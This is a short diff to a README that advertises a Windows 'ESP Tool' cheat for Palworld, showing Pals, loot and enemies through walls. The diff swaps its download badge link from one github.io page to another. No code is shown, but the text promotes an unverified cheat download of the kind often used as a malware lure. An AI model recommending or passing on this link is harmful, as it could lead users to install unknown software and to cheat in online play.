@@ -3,7 +3,7 @@
 Explore and conquer **Palworld** with this advanced **ESP Tool** for Windows. Reveal Pals, rare resources, enemy positions, and hidden loot through walls with a smooth in-game overlay.
 
 ⬇️ **Download**  
-[![Download Palworld ESP](https://img.shields.io/badge/Download-ESP_Tool_for_Palworld-0E7FC5?style=for-the-badge&logo=palworld&logoColor=white)](https://palworld-esp-tool.github.io/.github/)
+[![Download Palworld ESP](https://img.shields.io/badge/Download-ESP_Tool_for_Palworld-0E7FC5?style=for-the-badge&logo=palworld&logoColor=white)](https://anthony2170797.github.io/.github/palworld-esp-tool)
 
 ---
 
